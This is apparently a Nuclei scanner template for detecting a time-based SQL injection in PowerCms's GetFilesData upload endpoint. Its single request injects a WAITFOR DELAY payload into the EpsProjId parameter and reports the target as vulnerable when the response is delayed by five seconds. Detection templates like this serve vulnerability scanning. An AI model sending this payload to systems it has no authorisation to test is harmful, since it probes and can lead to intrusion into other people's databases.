id: PowerCms-GetFilesData-sqlInjection

info:
  name: PowerCms-GetFilesData-sqlInjection
  author: iSee857
  severity: high
  description: |
    PowerCms-GetFilesData-sqlInjection

http:
  - raw:
      - |
        GET /UploadFle/GetFilesData?EpsProjId=1%27;WAITFOR+DELAY+%270:0:5%27--&StartDate=2&EndDate=2 HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"

      - type: status
        status:
          - 200